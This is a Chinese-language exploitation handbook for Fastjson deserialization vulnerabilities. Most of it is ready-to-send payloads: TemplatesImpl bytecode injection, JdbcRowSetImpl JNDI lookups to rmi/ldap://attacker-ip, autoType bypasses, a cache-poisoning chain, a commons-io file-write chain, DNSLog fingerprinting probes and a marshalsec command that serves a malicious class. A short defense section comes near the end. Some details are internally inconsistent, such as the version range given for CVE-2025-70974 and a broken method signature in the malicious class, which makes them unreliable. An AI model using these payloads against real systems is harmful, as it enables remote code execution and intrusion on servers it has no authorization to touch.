---
title: "Fastjson 反序列化漏洞完全工作手册 — 从基础使用到漏洞利用"
author: "追梦信安 / 整理补充"
source: "https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw"
date: 2026-05-17
tags:
  - fastjson
  - java-security
  - deserialization
  - rce
  - jndi-injection
  - cve
  - autotype-bypass
category: "vulnerability-research"
description: "Fastjson 反序列化漏洞从零到一的完整工作手册。涵盖前置知识（Fastjson 使用、@type、JNDI、RMI、LDAP、反射）、漏洞原理分析、1.2.24~1.2.83 各版本利用链与 Payload、以及防御方案。全文收录全部 PoC 代码。"
---

# Fastjson 反序列化漏洞完全工作手册

> 原文作者：追梦信安（两万字长文基础篇）
> 本文在此基础上补充了 1.2.68 ~ 1.2.83、CVE-2025-70974 等最新漏洞及利用代码

---

## 目录

- [一、前置知识](#一前置知识)
  - [1. Fastjson 基础使用](#1-fastjson-基础使用)
  - [2. @type 是什么](#2-type-是什么)
  - [3. JNDI 是什么](#3-jndi-是什么)
  - [4. RMI 是什么](#4-rmi-是什么)
  - [5. LDAP 是什么](#5-ldap-是什么)
  - [6. Java 反射是什么](#6-java-反射是什么)
- [二、漏洞核心原理](#二漏洞核心原理)
  - [1. AutoType 机制是万恶之源](#1-autotype-机制是万恶之源)
  - [2. 利用链的两大核心](#2-利用链的两大核心)
- [三、各版本漏洞分析与 PoC（从基础到最新）](#三各版本漏洞分析与-poc从基础到最新)
  - [1. <=1.2.24 — 默认开 Autotype + TemplatesImpl 链](#1-1224--默认开-autotype--templatesimpl-链)
  - [2. 1.2.25 — 黑白名单绕过（L; 绕过）](#2-1225--黑白名单绕过l-绕过)
  - [3. 1.2.42 — 双 L 绕过](#3-1242--双-l-绕过)
  - [4. 1.2.43 — [ 符号绕过](#4-1243--符号绕过)
  - [5. 1.2.45 — MyBatis JndiDataSourceFactory 绕过](#5-1245--mybatis-jndidatasourcefactory-绕过)
  - [6. 1.2.47 — 缓存投毒绕过（最危险绕过之一）](#6-1247--缓存投毒绕过最危险绕过之一)
  - [7. 1.2.68 — Throwable/AutoCloseable 绕过](#7-1268--throwableautocloseable-绕过)
  - [8. 1.2.80 — Exception 链绕过（CVE-2022-25845）](#8-1280--exception-链绕过cve-2022-25845)
  - [9. 1.2.83 — 最终修复版本](#9-1283--最终修复版本)
  - [10. CVE-2025-70974 — AutoType 复活性绕过](#10-cve-2025-70974--autotype-复活性绕过)
- [四、版本速查表](#四版本速查表)
- [五、防御方案](#五防御方案)
- [六、实战常见 Q&A](#六实战常见-qa)
- [七、常用工具与资源](#七常用工具与资源)

---

## 一、前置知识

### 1. Fastjson 基础使用

#### 1.1 Maven 依赖

```xml
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.50</version>
        <!-- 注意：所有 1.x < 1.2.83 和 2.x < 2.0.45 都有安全风险 -->
    </dependency>
</dependencies>
```

版本查询网站：<https://mvnrepository.com/artifact/com.alibaba/fastjson>

#### 1.2 基础序列化/反序列化 Demo

```java
package org.example;
import com.alibaba.fastjson.JSON;

public class Main {
    public static void main(String[] args) {
        // === 序列化：Java对象 → JSON ===
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString); // {"age":18,"name":"Alice"}

        // === 反序列化：JSON → Java对象 ===
        String jsonString2 = "{\"age\":20,\"name\":\"Bob\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge()); // Bob, 20
    }

    public static class Person {
        private String name;
        private int age;
        public Person(String name, int age) {
            this.name = name; this.age = age;
        }
        public Person() {} // 反序列化必须有无参构造
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        public int getAge() { return age; }
        public void setAge(int age) { this.age = age; }
    }
}
```

#### 1.3 @JSONField 注解：自定义字段映射

```java
public static class Person {
    @JSONField(name = "user_name")
    private String name;
    @JSONField(name = "user_age")
    private int age;
    // ... getter/setter 略
}
// 输入 {"user_name":"Bob","user_age":20} 可正确映射
```

#### 1.4 @JSONType 注解：控制序列化顺序

```java
@JSONType(orders = {"name", "age"})
public static class Person {
    // 输出 {"name":"Alice","age":18} 保持属性声明顺序
}
```

> **重要**：Fastjson 默认按**属性字母序**序列化，不是声明顺序。

---

### 2. @type 是什么

`@type` 是 Fastjson 中用于在 JSON 中标识 Java 对象类型的特殊字段。它是漏洞的**根源**。

#### 2.1 fastjson 的自省机制

序列化时传入 `SerializerFeature.WriteClassName` 会在 JSON 中添加 `@type`：

```java
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
System.out.println(s1);
// 输出：{"@type":"org.example.Person","age":18,"name":"xiaoming"}
```

反序列化时 Fastjson 依据 `@type` 确定目标 Java 类类型。

#### 2.2 三种反序列化方式

```java
// 方法一：parse() 返回 JSONObject
JSONObject jsonObject = JSON.parse(s1);

// 方法二：parseObject() 指定目标 class
Person user1 = JSON.parseObject(s, Person.class);

// 方法三：parseObject() 传入带 @type 的 JSON
Person user1 = JSON.parseObject(s1, Person.class);
```

#### 2.3 @type 漏洞演示（1.2.24 以下版本）

```java
String json = "{\"@type\":\"java.lang.Runtime\"}";
ParserConfig.getGlobalInstance().addAccept("java.lang");
Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
runtime.exec("calc.exe");
```

> **注意**：从 1.2.24 之后 Fastjson 默认禁用 AutoType，需显式开启。

---

### 3. JNDI 是什么

JNDI (Java Naming and Directory Interface) 是 Java 平台的 API，统一访问各种命名和目录服务。常用于 JavaEE 应用中查找资源（JDBC 数据源、JMS 连接等）。

#### 3.1 Tomcat + JNDI 数据源配置

1. 修改 `context.xml` 配置数据源：
```xml
<Resource name="jdbc/security" auth="Container"
  type="javax.sql.DataSource"
  maxTotal="100" maxIdle="30" maxWaitMillis="10000"
  username="root" password="123456"
  driverClassName="com.mysql.jdbc.Driver"
  url="jdbc:mysql://localhost:3306/security" />
```

2. 修改 `web.xml` 引用数据源：
```xml
<resource-ref>
  <description>Test DB Connection</description>
  <res-ref-name>jdbc/root</res-ref-name>
  <res-type>javax.sql.DataSource</res-type>
  <res-auth>Container</res-auth>
</resource-ref>
```

3. Java 代码中通过 JNDI 获取数据源：
```java
Context initCtx = new InitialContext();
DataSource ds = (DataSource) initCtx.lookup("java:comp/env/jdbc/security");
Connection conn = ds.getConnection();
```

> **漏洞中的角色**：JNDI lookup 动作可以被攻击者利用，指向恶意 RMI/LDAP 服务器，从而加载远程恶意类。

---

### 4. RMI 是什么

RMI (Remote Method Invocation) 是 Java 的远程方法调用协议。

#### 4.1 RMI 基础 Demo

```java
// 1. 定义远程接口
import java.rmi.Remote;
import java.rmi.RemoteException;
public interface HelloInterface extends Remote {
    public String sayHello(String name) throws RemoteException;
}

// 2. 实现远程接口
import java.rmi.server.UnicastRemoteObject;
public class HelloImpl extends UnicastRemoteObject implements HelloInterface {
    protected HelloImpl() throws RemoteException { super(); }
    @Override
    public String sayHello(String name) { return "Hello " + name; }
}

// 3. 注册 RMI 服务端
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class RMIServer {
    public static void main(String[] args) throws Exception {
        HelloImpl hello = new HelloImpl();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.rebind("hello", hello);
    }
}

// 4. 客户端调用
public class RMIClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        HelloInterface hello = (HelloInterface) registry.lookup("hello");
        System.out.println(hello.sayHello("Alice"));
    }
}
```

#### 4.2 RMI 在漏洞中的作用

攻击者搭建恶意 RMI 服务器，Fastjson 反序列化时调用 JNDI lookup 指向恶意 RMI 地址，RMI 服务器返回远程加载的恶意类代码。

---

### 5. LDAP 是什么

LDAP (Lightweight Directory Access Protocol) 轻量目录访问协议。

#### 5.1 公司-员工管理类比理解 LDAP

**目录树结构**：
```
com (公司)
└── example (部门)
    ├── cn=Alice (员工A)
    └── cn=Bob (员工B)
```

**在漏洞中的作用**：LDAP 同样可以作为 JNDI lookup 的目标。攻击者搭建恶意 LDAP 服务器，返回包含恶意代码的 Java 类引用。JDK 8u191 之后 LDAP 也受到 trustURLCodebase 限制。

---

### 6. Java 反射是什么

Java 反射（Reflection）允许在运行时动态获取类的信息并操作对象，是 Java 动态特性的核心。

#### 6.1 反射 Demo

```java
// 1. 获取 Class 对象
Class<?> clazz = Class.forName("org.example.Person");

// 2. 创建实例
Object obj = clazz.newInstance();

// 3. 获取方法并调用
Method setNameMethod = clazz.getMethod("setName", String.class);
setNameMethod.invoke(obj, "Alice");

// 4. 获取字段（私有字段需 setAccessible）
Field nameField = clazz.getDeclaredField("name");
nameField.setAccessible(true);
String name = (String) nameField.get(obj);
```

#### 6.2 反射在漏洞中的关键作用

Fastjson 反序列化本质上就是通过反射来实例化类并调用 setter 方法：

```java
// Fastjson 内部逻辑（简化）
Class<?> clazz = Class.forName(typeName);  // 根据 @type 反射获取类
Object obj = clazz.newInstance();            // 创建实例
Method setter = clazz.getMethod("set" + fieldName, fieldType);
setter.invoke(obj, fieldValue);              // 调用 setter 注入属性值
```

这就是为什么只要找到一个类，它的 setter 方法中做了危险操作（如 JNDI lookup、执行命令等），攻击者就能通过精心构造的 JSON 触发 RCE。

---

## 二、漏洞核心原理

### 1. AutoType 机制是万恶之源

Fastjson 的 AutoType 机制本意是为了在反序列化时恢复复杂对象类型。流程如下：

```
接收到 JSON →
  提取 @type 字段的值（目标类的全限定名） →
  通过 ClassLoader 加载指定类 →
  创建该类实例（调用默认构造方法） →
  通过 setter 方法注入属性值
```

**问题**：如果目标类的 setter 方法中包含了危险操作（如 JNDI lookup、反射执行代码），攻击者就可以通过构造恶意 JSON 触发 RCE。

### 2. 利用链的两大核心

#### 2.1 自动调用 setter + JNDI 注入

- **自动调用 setter**：Fastjson 反序列化时自动调用对象的所有 setter 方法
- **JNDI 注入**：类如 `JdbcRowSetImpl` 的 `setDataSourceName` 方法发起 JNDI 查询，指向攻击者控制的 RMI/LDAP 地址

#### 2.2 TemplatesImpl 链

- **核心类**：`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
- **利用方式**：通过 `_bytecodes` 字段注入恶意字节码（Base64 编码的 .class 文件）
- **限制**：需要 `Feature.SupportNonPublicField` 支持（因为 `_bytecodes` 是私有字段）

---

## 三、各版本漏洞分析与 PoC（从基础到最新）

### 1. <=1.2.24 — 默认开 Autotype + TemplatesImpl 链

**CVE：** CVE-2017-18349

这是 Fastjson 最经典的漏洞。1.2.24 及之前版本 AutoType 默认开启，且没有黑白名单。

#### 1.1 TemplatesImpl 链利用

**恶意类代码**（需要继承 `AbstractTranslet`）：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.xml.internal.dtd.DTDHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, DTDHandler handler) throws TransletException {}

    @Override
    public void transform(DOM document, com.sun.xml.internal.dtd.DTDHandler handler) throws TransletException {}
}
```

**生成 Base64 字节码并构造 PoC**：

```java
public static void main(String args[]) {
    try {
        byte[] bytes = Files.readAllBytes(Paths.get("E:/Evil.class"));
        String base64 = java.util.Base64.getEncoder().encodeToString(bytes);
        
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String poc = "{\"@type\":\"" + NASTY_CLASS +
            "\",\"_bytecodes\":[\""+base64+"\"],'_name':'pwn','_tfactory':{},\"_outputProperties\":{}}";
        System.out.println(poc);
        
        // 必须指定 Feature.SupportNonPublicField 才能访问私有字段
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

**发送的 JSON PoC**：
```json
{
    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes":["BASE64_ENCODED_EVIL_CLASS"],
    "_name":"pwn",
    "_tfactory":{},
    "_outputProperties":{}
}
```

> **原理**：`TemplatesImpl.getOutputProperties()` → `newTransformer()` → `getTransletInstance()` → `defineTransletClasses()` → `ClassLoader.defineClass()` → 加载恶意字节码，执行 `static` 代码块。

#### 1.2 JdbcRowSetImpl 链利用（同样适用于 1.2.24）

```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://attacker-ip:1099/evil",
    "autoCommit":true
}
```

触发路径：`setAutoCommit(true)` → `connect()` → `InitialContext.lookup(dataSourceName)` → 加载远程恶意类

---

### 2. 1.2.25 — 黑白名单绕过（L; 绕过）

从 1.2.25 开始，Fastjson 加入了黑白名单机制，默认关闭 AutoType。

**黑名单内容（部分）**：
```
com.sun.rowset.JdbcRowSetImpl, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, ...
```

**绕过方式：L; 格式**：
```
原类名：com.sun.rowset.JdbcRowSetImpl
绕过名：Lcom.sun.rowset.JdbcRowSetImpl;
```

Fastjson 在对类名做黑名单检查后，会调用 `TypeUtils.getClass()` 对 "L;" 格式进行还原处理。

**PoC**：
```json
{
    "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName":"rmi://attacker-ip:1099/evil",
    "autoCommit":true
}
```

> **注意**：需要服务端开启了 `ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`。

---

### 3. 1.2.42 — 双 L 绕过

1.2.42 在黑名单校验中加了 `.replace("L", "").replace(";", "")`（去首尾去尾的增强版），但实现有 Bug。

**绕过方式：双写 LL 和 ;;**
```
原类名：com.sun.rowset.JdbcRowSetImpl
绕过名：LLcom.sun.rowset.JdbcRowSetImpl;;
```

Fastjson 的修复逻辑只做一次 `.replace`，双写后还原恰好得到有效类名。

**PoC**：
```json
{
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"rmi://attacker-ip:1099/evil",
    "autoCommit":true
}
```

---

### 4. 1.2.43 — [ 符号绕过

1.2.43 修复了双 L 绕过，但新增了 `[` 符号绕过。

**绕过方式**：
```
原类名：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
绕过名：[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[
```

**PoC**：
```json
{
    "@type":"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[",
    "_bytecodes":["BASE64_ENCODED_EVIL_CLASS"],
    "_outputProperties":{}
}
```

> **限制**：需要 `Feature.SupportNonPublicField`（因为 TemplatesImpl 的私有字段需要显式访问）

---

### 5. 1.2.45 — MyBatis JndiDataSourceFactory 绕过

**条件**：项目中引入了 MyBatis 依赖

利用 MyBatis 中的 `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`，不在黑名单中。

**PoC**：
```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"rmi://attacker-ip:1099/evil"
    }
}
```

触发路径：`setProperties()` → `InitialContext.lookup(data_source)` → RCE

---

### 6. 1.2.47 — 缓存投毒绕过（最危险绕过之一）

这是 Fastjson 历史上**最危险的绕过**之一。**不需要开启 AutoType**，纯粹利用缓存机制绕过黑白名单。

#### 核心原理

```
第一步（缓存投毒）：
  {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
  → 将 JdbcRowSetImpl 写入 TypeUtils.mappings 缓存

第二步（直接利用）：
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://...","autoCommit":true}
  → 从缓存中找到该类，跳过黑白名单检查
```

**完整 PoC**：
```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://attacker-ip:1099/evil",
        "autoCommit":true
    }
}
```

#### 为什么这是最危险的？

- **不需要设定 AutoTypeSupport = true**
- **不需要 Feature.SupportNonPublicField**
- **不依赖黑白名单绕过**（缓存在前，检查在后）
- 攻击者只需发送一个 JSON 即可

---

### 7. 1.2.68 — Throwable/AutoCloseable 绕过

1.2.47 的修复方式是在 checkAutoType 中增加了对缓存的检查，但 1.2.68 引入了新的绕过思路。

#### 核心原理

`TypeUtils.mappings` 中内置了大量可以直接反序列化的类（无需通过 checkAutoType），包括 `AutoCloseable`, `Exception`, `Closeable` 等。

```
mappings 中的类 → 直接通过检查 → 获取反序列化器（ThrowableDeserializer）
  → 对该类的子属性进行递归反序列化
  → 将子属性类型加入 ParserConfig.deserializers 缓存
  → 后续利用这些缓存的类绕过黑名单
```

#### PoC：版本探测

```json
// <=1.2.68 版本探测
[
    {"@type":"java.lang.AutoCloseable", "@type":"java.io.ByteArrayOutputStream"},
    {"@type":"java.io.ByteArrayOutputStream"},
    {"@type":"java.net.InetSocketAddress", "address":, "val":"dnslog-url"}
]
```

#### PoC：commons-io 写文件（1.2.68, 依赖 commons-io 2.0-2.6）

利用 `AutoCloseable` → `TeeInputStream` → `ReaderInputStream` + `CharSequenceReader`（读内容）+ `WriterOutputStream` + `FileWriterWithEncoding`（写文件）。

```json
{
    "x":{
        "@type":"com.alibaba.fastjson.JSONObject",
        "input":{
            "@type":"java.lang.AutoCloseable",
            "@type":"org.apache.commons.io.input.ReaderInputStream",
            "reader":{
                "@type":"org.apache.commons.io.input.CharSequenceReader",
                "charSequence":{"@type":"java.lang.String","文件内容要超过8192字符"}
            },
            "charsetName":"UTF-8",
            "bufferSize":1024
        },
        "branch":{
            "@type":"java.lang.AutoCloseable",
            "@type":"org.apache.commons.io.output.WriterOutputStream",
            "writer":{
                "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
                "file":"/tmp/pwned",
                "encoding":"UTF-8",
                "append": false
            },
            "charsetName":"UTF-8",
            "bufferSize": 1024,
            "writeImmediately": true
        },
        "trigger":{
            "@type":"java.lang.AutoCloseable",
            "@type":"org.apache.commons.io.input.XmlStreamReader",
            "is":{
                "@type":"org.apache.commons.io.input.TeeInputStream",
                "input":{"$ref":"$.input"},
                "branch":{"$ref":"$.branch"},
                "closeBranch": true
            },
            "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"
        },
        "trigger2":{
            "@type":"java.lang.AutoCloseable",
            "@type":"org.apache.commons.io.input.XmlStreamReader",
            "is":{
                "@type":"org.apache.commons.io.input.TeeInputStream",
                "input":{"$ref":"$.input"},
                "branch":{"$ref":"$.branch"},
                "closeBranch": true
            },
            "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"
        },
        "trigger3":{
            "@type":"java.lang.AutoCloseable",
            "@type":"org.apache.commons.io.input.XmlStreamReader",
            "is":{
                "@type":"org.apache.commons.io.input.TeeInputStream",
                "input":{"$ref":"$.input"},
                "branch":{"$ref":"$.branch"},
                "closeBranch": true
            },
            "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"
        }
    }
}
```

**写文件原理**：`XmlStreamReader(InputStream)` → `TeeInputStream.read()` 将输入流写入输出流 → `ReaderInputStream` 读取 `CharSequenceReader` 的内容 → `WriterOutputStream` 通过 `FileWriterWithEncoding` 写入文件。通过 `$ref` 重复引用同一个缓冲区填满 8192 字节的写入限制。

---

### 8. 1.2.80 — Exception 链绕过（CVE-2022-25845）

#### 影响版本

Fastjson ≤ 1.2.80

#### 核心原理

1.2.68 中 `java.lang.AutoCloseable` 等类被加入了黑名单（expectClass 检测 hash），但 `Throwable` 的子类未被完全封堵。

利用思路：
```
① 第一个 @type 指定 java.lang.Exception
    → checkAutoType 从 TypeUtils.mappings 中找到，通过检查
    → 获取 ThrowableDeserializer

② 第二个 @type 指定恶意 Exception 子类（自定义类）
    → 绕过黑名单（因为 expectClass=Throwable，且自定义类不在黑名单中）
    → 将该类的类型（字段类型）加入 ParserConfig.deserializers 缓存

③ 后续 @type 指定另一个类
    → 从缓存中找到，通过检查
    → 使用该类进行后续反序列化/攻击
```

#### PoC 核心结构

```json
{
    "a":{
        "@type":"java.lang.Exception",
        "@type":"pojo.MyException",
        "myClass":{},
        "stackTrace":[]
    },
    "b":{
        "@type":"pojo.MyClass",
        "name":"asd"
    }
}
```

**利用原理总结**：`ThrowableDeserializer` 在反序列化 Throwable 对象时，会将 public 属性、setter 方法参数、构造方法参数加入到 ParserConfig.deserializers 缓存中，从而绕过 checkAutoType 的黑白名单校验。

#### 完整利用链

```
① java.lang.Exception（TypeUtils.mappings 中内置）
   → ThrowableDeserializer
   → 反序列化子类时将其属性类加入缓存
② 自定义类通过缓存绕过 checkAutoType
③ 替换自定义类为 JdbcRowSetImpl 等利用类
   → JNDI lookup → RCE
```

---

### 9. 1.2.83 — 最终修复版本

1.2.83 的修复策略：
1. 进一步收紧 expectClass 检查，增加更多黑名单 hash
2. 修复 1.2.80 中 `Exception` → `ThrowableDeserializer` 的绕过路径
3. 推荐使用 SafeMode（完全禁用 @type 解析）

**推荐升级**：
```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>
```

但注意：1.2.83 之后仍有绕过发现（CVE-2025-70974）。

---

### 10. CVE-2025-70974 — AutoType 复活性绕过

#### 基本信息

- **CVSS 评分**：9.8（Critical）
- **影响版本**：Fastjson < 1.2.48
- **利用目标**：autoType 处理逻辑中的 JNDI 注入
- **活跃利用**：Androxgh0st 僵尸网络在 2025 年大规模利用

#### 漏洞描述

此漏洞实际上是 1.2.47 缓存投毒漏洞的**复活版**。在 2019 年首次被发现修复后，因部分企业未及时升级而在 2025 年被大规模利用。

攻击者通过构造包含 `@type` 键的恶意 JSON 文档，结合 JNDI 注入 payload，绕过 autoType 安全检查，实现远程代码执行。

#### PoC

```json
{
    "@type":"java.lang.Class",
    "val":"com.sun.rowset.JdbcRowSetImpl"
}
```

结合后续的 JNDI 注入：
```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://attacker-ip:1389/evil",
    "autoCommit":true
}
```

#### 防御

升级到 Fastjson 1.2.48 及以上版本。

---

## 四、版本速查表

| 版本 | 漏洞类型 | 绕过方式 | 关键 PoC | 是否需要开启 AutoType? |
|------|---------|---------|---------|----------------------|
| ≤1.2.24 | AutoType 默认开 | 无黑名单 | `JdbcRowSetImpl` + RMI | ❌ 不需要（默认开） |
| 1.2.25 | 黑白名单绕过 | `Lcom.xxx;` | `Lcom.sun.rowset.JdbcRowSetImpl;` | ✅ 需要 |
| 1.2.42 | 黑白名单绕过 | `LLcom.xxx;;` | `LLcom.sun.rowset.JdbcRowSetImpl;;` | ✅ 需要 |
| 1.2.43 | 黑白名单绕过 | `[类名[` | `[TemplatesImpl[` | ✅ 需要 |
| 1.2.45 | MyBatis 依赖绕过 | `JndiDataSourceFactory` | `JndiDataSourceFactory` + `data_source` | ✅ 需要 |
| 1.2.47 | 缓存投毒 | `java.lang.Class` + val | 两步式：缓存→利用 | ❌ 不需要 |
| 1.2.68 | Throwable 子类绕过 | `AutoCloseable` chain | commons-io 写文件 | ❌ 不需要 |
| 1.2.80 | Exception 链绕过 | double `@type` Exception | 自定义 Exception 子类 → 缓存投毒 | ❌ 不需要 |
| 1.2.83 | 已修复 | — | — | — |
| 2.x < 2.0.45 | 多种绕过 | 同上 | — | — |

---

## 五、防御方案

### 方案 1：升级到安全版本

```
1.x 系列 → ≥ 1.2.83
2.x 系列 → ≥ 2.0.45
```

### 方案 2：禁用 AutoType

```java
// 代码配置
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);

// JVM 启动参数
-Dfastjson.autoTypeSupport=false

// Spring application.properties
fastjson.autoTypeSupport=false
```

### 方案 3：启用 SafeMode（彻底阻断 @type）

```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```

SafeMode 会完全禁用 @type 解析，即使配置了白名单也无法加载自定义类。

### 方案 4：严格白名单（若要使用 AutoType）

```java
ParserConfig config = ParserConfig.getGlobalInstance();
config.addAccept("com.yourcompany.");
// 不要使用通配符 *，尽量缩小范围
// 优先使用白名单，而非黑名单（黑名单极易被绕过）
```

### 方案 5：依赖检测

```bash
# 检查项目中 Fastjson 版本
mvn dependency:tree | grep fastjson

# 或检查 jar 包
find . -name "fastjson*.jar"
```

### 方案 6：Web 应用防火墙（WAF）

对包含 `@type` 字段的 JSON 请求进行深度检测和过滤。

---

## 六、实战常见 Q&A

### Q1: 如何判断目标是否使用了 Fastjson？

**方式一：不闭合 JSON**
```json
{"name":"hello", "age":2
```
Fastjson 报错信息会暴露版本。

**方式二：DNSLog 探测（最推荐）**
```json
{"@type":"java.net.Inet4Address","val":"dnslog-url"}
```
DNS 能接收到请求则使用 Fastjson。

**方式三：特殊语法探测**
```json
{"a":new a(1),"b":x'11',/*\\*\/"c":Set[{}{}],"d":"\\u0000\\x00"}
{"@type":"java.lang.AutoCloseable"}
```

### Q2: 为什么 @type 必须是 JSON 的第一个字段？

Fastjson 解析时优先处理 @type 字段，如果放后面，解析其他字段可能先触发异常，导致 @type 未被处理。

### Q3: 为什么 TemplatesImpl 需要 Feature.SupportNonPublicField？

因为 `_bytecodes` 字段是私有字段，Fastjson 默认不解析私有属性。添加此 feature 允许注入 Base64 编码的恶意字节码。

### Q4: 高版本 JDK 下 JNDI 注入失效怎么办？

JDK 8u191 之后，LDAP 和 RMI 的 trustURLCodebase 默认为 false，无法通过远程加载类。解法：
- 使用本地类绕过（利用本地存在的类构造利用链）
- 使用 `JdbcRowSetImpl` + 不出网利用
- Tomcat BCEL 利用（需要 tomcat-dbcp 依赖）

### Q5: 不出网环境下怎么利用？

- **BCEL ClassLoader**（JDK < 8u251, Tomcat 7/8）
  - Tomcat7: `org.apache.tomcat.dbcp.dbcp.BasicDataSource`
  - Tomcat8+: `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`
- **写文件**：利用 1.2.68 的 commons-io 链写入恶意文件
- **配合反序列化知识**：结合其他反序列化 gadget

### Q6: 如何探测依赖是否存在？

利用 Character 转换报错：
```json
{
    "x":{
        "@type":"java.lang.Character"{
            "@type":"java.lang.Class",
            "val":"org.springframework.web.bind.annotation.RequestMapping"
        }
    }
}
```
根据报错信息判断是否存在该依赖。

### Q7: 各版本的 DNS 探测 PoC 有什么区别？

```json
// <=1.2.47
[{"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},{"@type":"java.io.ByteArrayOutputStream"},{"@type":"java.net.InetSocketAddress", "address":, "val":"xxx.ceye.io"}]

// <=1.2.68
[{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"},{"@type":"java.io.ByteArrayOutputStream"},{"@type":"java.net.InetSocketAddress", "address":, "val":"xxx.ceye.io"}]

// <=1.2.80（1.2.83 收到两个请求）
[{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress", "address":, "val":"xxx.dnslog.cn"}},{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress", "address":, "val":"xxx.dnslog.cn"}}]
```

---

## 七、常用工具与资源

### 在线 Payload 生成

- **JNDI 注入工具**：`https://github.com/welk1n/JNDI-Injection-Exploit`
- **Marshalsec**：`https://github.com/mbechler/marshalsec`（快速启 JNDI/LDAP 服务）
- **JNDIExploit**：`https://github.com/feihong-cs/JNDIExploit`

### 常用命令

```bash
# 启动 RMI/LDAP 服务
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker-ip:8000/#Evil" 1099

# 启动 HTTP 服务器（提供恶意类文件）
python3 -m http.server 8000
```

### 参考文章

- [Fastjson 全版本检测及利用 PoC](https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md) — 大量已测试通过的 PoC
- [FastjsonParty 全版本 Docker 漏洞环境](https://github.com/lemono0/FastJsonParty)
- [CVE-2022-25845 详细分析 (JFrog)](https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/)
- [Deep Dive into Fastjson (Dev.to)](https://dev.to/tiger_smith_9f421b9131db5/deep-dive-into-fastjson-deserialization-vulnerabilities-from-principles-to-practical-defense-2ka6)
- [JNDI 注入详解 (TTTang)](https://tttang.com/archive/1405/)

---

*原文：[【两万字原创长文】完全零基础入门 Fastjson 系列漏洞（基础篇）](https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw) — 追梦信安*
*本文在此基础进行了结构整理、代码格式化、并补充了 1.2.68~1.2.83 及 CVE-2025-70974 的最新利用技术。*
